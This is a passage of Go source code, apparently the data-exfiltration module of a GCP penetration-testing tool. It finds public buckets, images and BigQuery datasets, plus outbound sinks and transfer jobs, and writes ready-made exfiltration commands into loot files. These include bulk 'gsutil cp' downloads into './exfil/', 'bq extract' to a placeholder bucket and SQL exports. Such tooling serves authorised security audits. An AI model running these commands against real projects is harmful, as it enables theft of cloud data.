					Size:         fmt.Sprintf("%d GB", image.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("VM image (%d GB) accessible to %s", image.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"VM image is publicly accessible", "May contain embedded credentials or sensitive data"},
					ExploitCommand: fmt.Sprintf(
						"# Create instance from public image\n"+
							"gcloud compute instances create exfil-vm --image=projects/%s/global/images/%s --zone=us-central1-a",
						projectID, image.Name),
				}

				m.mu.Lock()
				m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list images in project %s", projectID))
	}
}

// findPublicBuckets finds GCS buckets with public access
func (m *DataExfiltrationModule) findPublicBuckets(ctx context.Context, projectID string, logger internal.Logger) {
	storageService, err := storage.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Storage service in project %s", projectID))
		return
	}

	resp, err := storageService.Buckets.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list buckets in project %s", projectID))
		return
	}

	for _, bucket := range resp.Items {
		policy, err := storageService.Buckets.GetIamPolicy(bucket.Name).Do()
		if err != nil {
			continue
		}

		accessLevel := ""
		for _, binding := range policy.Bindings {
			for _, member := range binding.Members {
				if shared.IsPublicPrincipal(member) {
					if member == "allUsers" {
						accessLevel = "allUsers"
						break
					}
					if accessLevel != "allUsers" {
						accessLevel = "allAuthenticatedUsers"
					}
				}
			}
		}

		if accessLevel != "" {
			export := PublicExport{
				ResourceType: "Storage Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				AccessLevel:  accessLevel,
				DataType:     "gcs_bucket",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("GCS bucket accessible to %s", accessLevel),
				Destination:  "Anyone with access level: " + accessLevel,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Bucket is publicly accessible", "May contain sensitive files"},
				ExploitCommand: fmt.Sprintf(
					"# List public bucket contents\n"+
						"gsutil ls -r gs://%s/\n"+
						"# Download all files\n"+
						"gsutil -m cp -r gs://%s/ ./exfil/",
					bucket.Name, bucket.Name),
			}

			m.mu.Lock()
			m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findCrossProjectLoggingSinks finds logging sinks that export to external destinations
func (m *DataExfiltrationModule) findCrossProjectLoggingSinks(ctx context.Context, projectID string, logger internal.Logger) {
	ls := loggingservice.New()
	sinks, err := ls.Sinks(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list logging sinks in project %s", projectID))
		return
	}

	for _, sink := range sinks {
		if sink.Disabled {
			continue
		}

		if sink.IsCrossProject {
			riskLevel := "HIGH"
			if sink.DestinationType == "pubsub" {
				riskLevel = "MEDIUM"
			}

			destDesc := fmt.Sprintf("%s in project %s", sink.DestinationType, sink.DestinationProject)

			path := ExfiltrationPath{
				PathType:     "Logging Sink",
				ResourceName: sink.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("Logs exported to %s", destDesc),
				Destination:  sink.Destination,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Logs exported to different project", "May contain sensitive information in log entries"},
				ExploitCommand: fmt.Sprintf(
					"# View sink configuration\n"+
						"gcloud logging sinks describe %s --project=%s\n"+
						"# Check destination permissions\n"+
						"# Destination: %s",
					sink.Name, projectID, sink.Destination),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPubSubPushEndpoints finds Pub/Sub subscriptions pushing to external HTTP endpoints
func (m *DataExfiltrationModule) findPubSubPushEndpoints(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Pub/Sub subscriptions in project %s", projectID))
		return
	}

	for _, sub := range subs {
		if sub.PushEndpoint == "" {
			continue
		}

		endpoint := sub.PushEndpoint
		isExternal := true
		if strings.Contains(endpoint, ".run.app") ||
			strings.Contains(endpoint, ".cloudfunctions.net") ||
			strings.Contains(endpoint, "appspot.com") ||
			strings.Contains(endpoint, "googleapis.com") {
			isExternal = false
		}

		if isExternal {
			riskLevel := "HIGH"

			path := ExfiltrationPath{
				PathType:     "Pub/Sub Push",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  "Subscription pushes messages to external endpoint",
				Destination:  endpoint,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Messages pushed to external HTTP endpoint", "Endpoint may be attacker-controlled"},
				ExploitCommand: fmt.Sprintf(
					"# View subscription configuration\n"+
						"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"# Test endpoint\n"+
						"curl -v %s",
					sub.Name, projectID, endpoint),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPubSubExportSubscriptions finds Pub/Sub subscriptions exporting to BigQuery or GCS
func (m *DataExfiltrationModule) findPubSubExportSubscriptions(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		return
	}

	for _, sub := range subs {
		if sub.BigQueryTable != "" {
			parts := strings.Split(sub.BigQueryTable, ".")
			if len(parts) >= 1 {
				destProject := parts[0]
				if destProject != projectID {
					path := ExfiltrationPath{
						PathType:     "Pub/Sub BigQuery Export",
						ResourceName: sub.Name,
						ProjectID:    projectID,
						Description:  "Subscription exports messages to BigQuery in different project",
						Destination:  sub.BigQueryTable,
						RiskLevel:    "MEDIUM",
						RiskReasons:  []string{"Messages exported to different project", "Data flows outside source project"},
						ExploitCommand: fmt.Sprintf(
							"gcloud pubsub subscriptions describe %s --project=%s",
							sub.Name, projectID),
					}

					m.mu.Lock()
					m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
					m.addExfiltrationPathToLoot(projectID, path)
					m.mu.Unlock()
				}
			}
		}

		if sub.CloudStorageBucket != "" {
			path := ExfiltrationPath{
				PathType:     "Pub/Sub GCS Export",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  "Subscription exports messages to Cloud Storage bucket",
				Destination:  "gs://" + sub.CloudStorageBucket,
				RiskLevel:    "MEDIUM",
				RiskReasons:  []string{"Messages exported to Cloud Storage", "Bucket may be accessible externally"},
				ExploitCommand: fmt.Sprintf(
					"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"gsutil ls gs://%s/",
					sub.Name, projectID, sub.CloudStorageBucket),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPublicBigQueryDatasets finds BigQuery datasets with public IAM bindings
func (m *DataExfiltrationModule) findPublicBigQueryDatasets(ctx context.Context, projectID string, logger internal.Logger) {
	bq := bigqueryservice.New()
	datasets, err := bq.BigqueryDatasets(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list BigQuery datasets in project %s", projectID))
		return
	}

	for _, dataset := range datasets {
		if dataset.IsPublic {
			export := PublicExport{
				ResourceType: "BigQuery Dataset",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				AccessLevel:  dataset.PublicAccess,
				DataType:     "bigquery_dataset",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public BigQuery",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("BigQuery dataset accessible to %s", dataset.PublicAccess),
				Destination:  "Anyone with access level: " + dataset.PublicAccess,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Dataset is publicly accessible", "Data can be queried by anyone"},
				ExploitCommand: fmt.Sprintf(
					"# Query public dataset\n"+
						"bq query --use_legacy_sql=false 'SELECT * FROM `%s.%s.INFORMATION_SCHEMA.TABLES`'\n"+
						"# Export data\n"+
						"bq extract --destination_format=CSV '%s.%s.TABLE_NAME' gs://your-bucket/export.csv",
					projectID, dataset.DatasetID, projectID, dataset.DatasetID),
			}

			m.mu.Lock()
			m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findCloudSQLExportConfig finds Cloud SQL instances with export configurations
func (m *DataExfiltrationModule) findCloudSQLExportConfig(ctx context.Context, projectID string, logger internal.Logger) {
	sqlService, err := sqladmin.NewService(ctx)
	if err != nil {
		return
	}

	resp, err := sqlService.Instances.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Cloud SQL instances in project %s", projectID))
		return
	}

	for _, instance := range resp.Items {
		if instance.Settings != nil && instance.Settings.BackupConfiguration != nil {
			backup := instance.Settings.BackupConfiguration
			if backup.Enabled && backup.BinaryLogEnabled {
				path := ExfiltrationPath{
					PathType:     "Cloud SQL Export",
					ResourceName: instance.Name,
					ProjectID:    projectID,
					Description:  "Cloud SQL instance with binary logging enabled (enables CDC export)",
					Destination:  "External via mysqldump/pg_dump or CDC",
					RiskLevel:    "LOW",
					RiskReasons:  []string{"Binary logging enables change data capture", "Data can be exported if IAM allows"},
					ExploitCommand: fmt.Sprintf(
						"# Check export permissions\n"+
							"gcloud sql instances describe %s --project=%s\n"+
							"# Export if permitted\n"+
							"gcloud sql export sql %s gs://bucket/export.sql --database=mydb",
						instance.Name, projectID, instance.Name),
				}

				m.mu.Lock()
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
	}
}

// findStorageTransferJobs finds Storage Transfer Service jobs to external destinations
func (m *DataExfiltrationModule) findStorageTransferJobs(ctx context.Context, projectID string, logger internal.Logger) {
	stsService, err := storagetransfer.NewService(ctx)
	if err != nil {
		return
	}

	filter := fmt.Sprintf(`{"projectId":"%s"}`, projectID)
	req := stsService.TransferJobs.List(filter)
	err = req.Pages(ctx, func(page *storagetransfer.ListTransferJobsResponse) error {
		for _, job := range page.TransferJobs {
			if job.Status != "ENABLED" {
				continue
			}

			var destination string
			var destType string
			var isExternal bool

			if job.TransferSpec != nil {
				if job.TransferSpec.AwsS3DataSource != nil {
					destination = fmt.Sprintf("s3://%s", job.TransferSpec.AwsS3DataSource.BucketName)
					destType = "AWS S3"
					isExternal = true
				}
				if job.TransferSpec.AzureBlobStorageDataSource != nil {
					destination = fmt.Sprintf("azure://%s/%s",
						job.TransferSpec.AzureBlobStorageDataSource.StorageAccount,
						job.TransferSpec.AzureBlobStorageDataSource.Container)
					destType = "Azure Blob"
					isExternal = true
				}
				if job.TransferSpec.HttpDataSource != nil {
					destination = job.TransferSpec.HttpDataSource.ListUrl
					destType = "HTTP"
					isExternal = true
				}
			}

			if isExternal {
				path := ExfiltrationPath{
					PathType:     "Storage Transfer",
					ResourceName: job.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Transfer job to %s", destType),
					Destination:  destination,
					RiskLevel:    "HIGH",
					RiskReasons:  []string{"Data transferred to external cloud provider", "Destination outside GCP control"},
					ExploitCommand: fmt.Sprintf(
						"# View transfer job\n"+
							"gcloud transfer jobs describe %s",
						job.Name),
				}

				m.mu.Lock()
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Storage Transfer jobs for project %s", projectID))
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *DataExfiltrationModule) addExfiltrationPathToLoot(projectID string, path ExfiltrationPath) {
	if path.ExploitCommand == "" {
		return
	}

	lootFile := m.LootMap[projectID]["data-exfiltration-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# [ACTUAL] %s: %s\n"+
			"# =============================================================================\n"+
			"# Project: %s\n"+
			"# Description: %s\n"+
			"# Destination: %s\n",
		path.PathType,
		path.ResourceName,
		path.ProjectID,
		path.Description,
		path.Destination,
	)

	lootFile.Contents += fmt.Sprintf("%s\n\n", path.ExploitCommand)
}

// ------------------------------
// Output Generation
// ------------------------------

func (m *DataExfiltrationModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *DataExfiltrationModule) getMisconfigHeader() []string {
	return []string{
		"Project",
		"Resource",
		"Type",
		"Destination",
		"Public",
		"Size",
	}
}

func (m *DataExfiltrationModule) getFoxMapperHeader() []string {
	return []string{
		"Scope Type",
		"Scope ID",
		"Principal Type",
		"Principal",
		"Service",
		"Permission",
		"Description",
	}
}

func (m *DataExfiltrationModule) pathsToTableBody(paths []ExfiltrationPath, exports []PublicExport) [][]string {
	var body [][]string

	publicResources := make(map[string]PublicExport)
	for _, e := range exports {
		key := fmt.Sprintf("%s:%s:%s", e.ProjectID, e.ResourceType, e.ResourceName)
		publicResources[key] = e
	}

	for _, p := range paths {
		key := fmt.Sprintf("%s:%s:%s", p.ProjectID, p.PathType, p.ResourceName)
		export, isPublic := publicResources[key]

		publicStatus := "No"
		size := "-"
		if isPublic {
			publicStatus = "Yes"
			size = export.Size
			delete(publicResources, key)
		}

		body = append(body, []string{
			m.GetProjectName(p.ProjectID),
			p.ResourceName,
			p.PathType,
			p.Destination,
			publicStatus,
			size,
		})
	}

	for _, e := range publicResources {
		body = append(body, []string{
			m.GetProjectName(e.ProjectID),
			e.ResourceName,
			e.ResourceType,
			"Public access: " + e.AccessLevel,
			"Yes",
			e.Size,
		})
	}

	return body
}

// foxMapperFindingsForProject returns findings for a specific project
// Includes: SAs from that project + users/groups (which can access any project)
// Also filters by scope: only org/folder/project findings in the project's hierarchy
func (m *DataExfiltrationModule) foxMapperFindingsForProject(projectID string) [][]string {
	var body [][]string

	// Get ancestor folders and org for filtering
	var ancestorFolders []string
	var projectOrgID string
	if m.OrgCache != nil && m.OrgCache.IsPopulated() {
		ancestorFolders = m.OrgCache.GetProjectAncestorFolders(projectID)
		projectOrgID = m.OrgCache.GetProjectOrgID(projectID)
	}
	ancestorFolderSet := make(map[string]bool)
	for _, f := range ancestorFolders {
		ancestorFolderSet[f] = true
	}

	for _, f := range m.FoxMapperFindings {
		for _, p := range f.Principals {
			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)

			// Include if: SA from this project OR user/group (no project - applies to all)
			if principalProject != projectID && principalProject != "" {
				continue
			}

			// Filter by scope hierarchy
			if !m.scopeMatchesProject(p.ScopeType, p.ScopeID, projectID, projectOrgID, ancestorFolderSet) {
				continue
			}

			// Determine principal type
			principalType := p.MemberType
			if principalType == "" {
				if p.IsServiceAccount {
					principalType = "serviceAccount"
				} else {
					principalType = "user"
				}
			}

			scopeType := p.ScopeType
			if scopeType == "" {
				scopeType = "-"
			}
			scopeID := p.ScopeID
			if scopeID == "" {
				scopeID = "-"
			}

			body = append(body, []string{
				scopeType,
				scopeID,
				principalType,
				p.Principal,
				f.Service,
				f.Permission,
				f.Description,
			})
		}
	}
	return body
}

// foxMapperFindingsWithoutProject returns findings for principals without a clear project
// (e.g., compute default SAs, users, groups)
func (m *DataExfiltrationModule) foxMapperFindingsWithoutProject() [][]string {
	var body [][]string
	for _, f := range m.FoxMapperFindings {
		for _, p := range f.Principals {
			// Extract project from principal
			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)

			// Only include if we couldn't determine the project
			if principalProject != "" {
				continue
			}

			// Determine principal type
			principalType := p.MemberType
			if principalType == "" {
				if p.IsServiceAccount {
					principalType = "serviceAccount"
				} else {
					principalType = "user"
				}
			}

			scopeType := p.ScopeType
			if scopeType == "" {
				scopeType = "-"
			}
			scopeID := p.ScopeID
			if scopeID == "" {
				scopeID = "-"
			}

			body = append(body, []string{
				scopeType,
				scopeID,
				principalType,
				p.Principal,
				f.Service,
				f.Permission,
				f.Description,
			})
		}
	}
	return body
}

// foxMapperFindingsToTableBodyForProject returns findings filtered by project
func (m *DataExfiltrationModule) foxMapperFindingsToTableBodyForProject(projectID string) [][]string {
	var body [][]string
	for _, f := range m.FoxMapperFindings {
		for _, p := range f.Principals {
			// Extract project from principal (uses existing function from privesc.go)
			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)

			// Only include if it matches this project
			if principalProject != projectID {
				continue
			}

			// Determine principal type
			principalType := p.MemberType
			if principalType == "" {
				if p.IsServiceAccount {
					principalType = "serviceAccount"
				} else {
					principalType = "user"
				}
			}

			scopeType := p.ScopeType
			if scopeType == "" {
				scopeType = "-"
			}

			body = append(body, []string{
				scopeType,
				principalProject,
				principalType,
				p.Principal,
				f.Service,
				f.Permission,
				f.Description,
			})
		}
	}
	return body
}

// foxMapperFindingsToTableBody returns all findings (for flat output)
func (m *DataExfiltrationModule) foxMapperFindingsToTableBody() [][]string {
	var body [][]string
	for _, f := range m.FoxMapperFindings {
		for _, p := range f.Principals {
			// Determine principal type
			principalType := p.MemberType
			if principalType == "" {
				if p.IsServiceAccount {
					principalType = "serviceAccount"
				} else {
					principalType = "user"
				}
			}

			scopeType := p.ScopeType
			if scopeType == "" {
				scopeType = "-"
			}
			scopeID := p.ScopeID
			if scopeID == "" {
				scopeID = "-"
			}

			body = append(body, []string{
				scopeType,
				scopeID,
				principalType,
				p.Principal,
				f.Service,
				f.Permission,
				f.Description,
			})
		}
	}
	return body
}

// scopeMatchesProject checks if a scope (org/folder/project) is in the hierarchy for a project
func (m *DataExfiltrationModule) scopeMatchesProject(scopeType, scopeID, projectID, projectOrgID string, ancestorFolderSet map[string]bool) bool {
	if scopeType == "" || scopeID == "" {
		// No scope info - include by default
		return true
	}

	switch scopeType {
	case "project":
		return scopeID == projectID
	case "organization":
		if projectOrgID != "" {
			return scopeID == projectOrgID
		}
		// No org info - include by default
		return true
	case "folder":
		if len(ancestorFolderSet) > 0 {
			return ancestorFolderSet[scopeID]
		}
		// No folder info - include by default
		return true
	case "resource":
		// Resource-level - include by default
		return true
	default:
		return true
	}
}

func (m *DataExfiltrationModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile

	paths := m.ProjectExfiltrationPaths[projectID]
	exports := m.ProjectPublicExports[projectID]

	if len(paths) > 0 || len(exports) > 0 {
		body := m.pathsToTableBody(paths, exports)
		if len(body) > 0 {
			tableFiles = append(tableFiles, internal.TableFile{
				Name:   "data-exfiltration-misconfigurations",
				Header: m.getMisconfigHeader(),
				Body:   body,
			})
		}
	}

	return tableFiles
}

func (m *DataExfiltrationModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		FolderLevelData:  make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Process each specified project (via -p or -l flags)
	for _, projectID := range m.ProjectIDs {
		m.initializeLootForProject(projectID)

		tableFiles := m.buildTablesForProject(projectID)

		// Add FoxMapper findings table for this project
		// Include SAs from this project + users/groups (which apply to all projects)
		foxMapperBody := m.foxMapperFindingsForProject(projectID)
		if len(foxMapperBody) > 0 {
			tableFiles = append(tableFiles, internal.TableFile{
				Name:   "data-exfiltration-permissions",
				Header: m.getFoxMapperHeader(),
				Body:   foxMapperBody,
			})
		}

		// Add loot files for this project
		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		// Add project-specific playbook
		playbook := m.generatePlaybookForProject(projectID)
		if playbook != nil && playbook.Contents != "" {
			lootFiles = append(lootFiles, *playbook)
		}

		// Always add all specified projects to output
		outputData.ProjectLevelData[projectID] = DataExfiltrationOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
}

func (m *DataExfiltrationModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allPaths := m.getAllExfiltrationPaths()
	allExports := m.getAllPublicExports()

	for _, projectID := range m.ProjectIDs {
		m.initializeLootForProject(projectID)
	}

	tables := []internal.TableFile{}

	misconfigBody := m.pathsToTableBody(allPaths, allExports)
	if len(misconfigBody) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration-misconfigurations",
			Header: m.getMisconfigHeader(),
			Body:   misconfigBody,
		})
	}

	if len(m.FoxMapperFindings) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration-permissions",
			Header: m.getFoxMapperHeader(),
			Body:   m.foxMapperFindingsToTableBody(),
		})
	}

	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	// For flat output, generate a combined playbook for all projects
	for _, projectID := range m.ProjectIDs {
		playbook := m.generatePlaybookForProject(projectID)
		if playbook != nil && playbook.Contents != "" {
			// Rename to include project
			playbook.Name = fmt.Sprintf("data-exfiltration-commands-%s", projectID)
			lootFiles = append(lootFiles, *playbook)
		}
	}

	output := DataExfiltrationOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
